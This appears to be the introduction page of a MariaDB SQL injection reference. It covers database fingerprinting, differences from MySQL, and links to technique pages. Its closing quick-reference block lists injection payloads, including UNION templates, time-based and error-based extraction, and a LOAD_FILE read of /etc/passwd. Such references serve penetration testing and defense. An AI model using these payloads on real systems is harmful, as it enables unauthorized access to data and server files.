---
title: MariaDB Intro
description: Overview of MariaDB SQL injection techniques and categories
category: Basics
order: 1
tags: ["introduction", "overview", "mariadb"]
lastUpdated: 2025-12-18
---

This section provides a comprehensive collection of SQL injection techniques specific to MariaDB databases. MariaDB is a community-developed fork of MySQL and shares many SQL injection techniques with its parent project, though there are notable differences in certain areas.

## Detecting MariaDB

Quick methods to identify if the target database is MariaDB:

```sql
-- Version string contains "MariaDB"
SELECT VERSION()
-- Returns: '10.6.24-MariaDB-ubu2204' (contains 'MariaDB')

-- MariaDB includes 'MariaDB' in @@version_comment
SELECT @@version_comment
-- Contains 'mariadb.org' or similar

-- Check for MariaDB-specific functions
SELECT JSON_DETAILED('{"a":1}')
-- Works on MariaDB, fails on MySQL

-- PASSWORD() function exists (removed in MySQL 8.0)
SELECT PASSWORD('test')
-- Works on MariaDB, fails on MySQL 8.0+
```

## Key Differences from MySQL

While MariaDB maintains strong compatibility with MySQL, the following areas show behavioral differences relevant to SQL injection:

| Feature             | MariaDB                 | MySQL 8.0+              |
| ------------------- | ----------------------- | ----------------------- |
| Default Auth Plugin | `mysql_native_password` | `caching_sha2_password` |
| Version Comments    | `/*!M100106 ... */`     | `/*!80000 ... */`       |
| PASSWORD() Function | Available               | Removed                 |
| OLD_PASSWORD()      | Available               | Removed                 |
| secure_file_priv    | Often less restrictive  | More restrictive        |

### Version Comment Syntax

```sql
-- MySQL-style version comments work in MariaDB
SELECT /*!50700 1, */ 'result' AS col
-- On MariaDB/MySQL 5.7+: SELECT 1, 'result' AS col
-- On older versions: SELECT 'result' AS col

-- Version comments can conditionally include SQL
SELECT id, username /*!50000 , email */ FROM users
-- Includes 'email' column only on 5.0+

-- Note: MariaDB's M-prefix syntax (/*!M100106 */) exists but
-- is not reliably supported across all MariaDB versions
```

### Password Functions

```sql
-- PASSWORD() still works in MariaDB (removed in MySQL 8.0)
SELECT PASSWORD('test')
-- Returns: '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'

-- OLD_PASSWORD() still works in MariaDB
SELECT OLD_PASSWORD('test')
-- Returns: '378b243e220ca493' (16-char pre-4.1 format)
```

### MariaDB-Specific Functions

```sql
-- JSON_DETAILED (MariaDB only)
SELECT JSON_DETAILED('[1,2,3]')

-- COLUMN_JSON (MariaDB dynamic columns)
SELECT COLUMN_JSON(COLUMN_CREATE('name', 'value'))

-- DECODE_HISTOGRAM (MariaDB statistics)
SELECT DECODE_HISTOGRAM(hist_type, histogram)
FROM mysql.column_stats LIMIT 1
```

## Basics

Fundamental concepts and techniques for MariaDB injection:

- [**Comment Out Query**](/mariadb/comment-out-query) - Using MariaDB comment syntax to modify queries
- [**Testing Injection**](/mariadb/testing-injection) - Methods to verify if a MariaDB injection point exists
- [**Constants**](/mariadb/constants) - Working with MariaDB constants in injection scenarios
- [**Operators**](/mariadb/operators) - Leveraging MariaDB operators for injection
- [**Default Databases**](/mariadb/default-databases) - Understanding and targeting MariaDB's default databases

## Information Gathering

Techniques to extract information from MariaDB databases:

- [**Testing Version**](/mariadb/testing-version) - Methods to determine MariaDB version
- [**Database Names**](/mariadb/database-names) - Retrieving available database names
- [**Server Hostname**](/mariadb/server-hostname) - Obtaining the MariaDB server hostname
- [**Server MAC Address**](/mariadb/server-mac-address) - Extracting MAC address information
- [**Tables and Columns**](/mariadb/tables-and-columns) - Discovering table and column names
- [**Database Credentials**](/mariadb/database-credentials) - Techniques to extract MariaDB credentials

## Injection Techniques

Advanced methods for exploiting MariaDB injection vulnerabilities:

- [**Avoiding Quotations**](/mariadb/avoiding-quotations) - Bypassing quote filters
- [**String Concatenation**](/mariadb/string-concatenation) - Techniques to concatenate strings in MariaDB
- [**Conditional Statements**](/mariadb/conditional-statements) - Using IF and CASE statements for advanced injections
- [**Stacked Queries**](/mariadb/stacked-queries) - Executing multiple statements in one injection
- [**MariaDB-Specific Code**](/mariadb/mariadb-specific-code) - Exploiting unique MariaDB functions and features
- [**Timing**](/mariadb/timing) - Time-based blind injection methods
- [**Fuzzing/Obfuscation**](/mariadb/fuzzing-obfuscation) - Techniques to bypass WAFs and filters

## Advanced Techniques

Sophisticated attacks for extracting data and gaining system access:

- [**Privileges**](/mariadb/privileges) - Determining and exploiting user privileges
- [**Reading Files**](/mariadb/reading-files) - Techniques to read files from the server filesystem
- [**Writing Files**](/mariadb/writing-files) - Methods to write files to the server
- [**Out-of-Band Channeling**](/mariadb/out-of-band-channeling) - Extracting data via alternative channels
- [**Password Hashing**](/mariadb/password-hashing) - Understanding and exploiting MariaDB password storage
- [**Password Cracking**](/mariadb/password-cracking) - Techniques to recover passwords from hashes

## Quick Reference

Common one-liners for MariaDB SQL injection:

```sql
-- Get version
SELECT VERSION()
SELECT @@version

-- Get current user
SELECT USER()
SELECT CURRENT_USER()

-- Get current database
SELECT DATABASE()

-- List all databases
SELECT schema_name FROM information_schema.schemata

-- List tables in current database
SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()

-- List columns in a table
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'

-- Read file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd')

-- Time-based blind injection
SELECT IF(1=1, SLEEP(5), 0)
SELECT BENCHMARK(10000000, SHA1('test'))

-- Error-based injection
SELECT EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))
SELECT UPDATEXML(1, CONCAT(0x7e, VERSION()), 1)

-- UNION injection template
' UNION SELECT 1,2,3,4 -- -
' UNION SELECT NULL,NULL,NULL,NULL -- -
```

Browse the techniques using the sidebar navigation or select a specific category to explore.
